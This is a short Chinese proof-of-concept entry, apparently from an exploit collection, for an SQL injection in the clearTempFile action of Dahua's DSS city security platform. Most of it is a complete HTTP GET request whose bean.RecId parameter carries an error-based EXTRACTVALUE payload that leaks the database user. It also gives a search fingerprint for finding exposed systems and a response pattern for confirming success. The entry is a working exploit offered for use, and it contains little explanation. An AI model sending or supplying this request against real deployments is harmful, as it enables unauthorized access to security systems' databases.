﻿# 大华DSS城市安防系统clearTempFile SQL注入漏洞

> 更新时间：2024-04-29

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="/portal/include/script/dahuaDefined/headCommon.js?type=index"&&title="DSS"

> 验证脚本：HTTP

```
GET /portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,user(),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1 HTTP/1.1
Connection: close
Accept-Encoding: gzip
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?XPATH)(?=.*?sql).*?$

> 上传文件定位：

> 验证文件来源：大华DSS城市安防系统clearTempFile SQL注入漏洞.poc

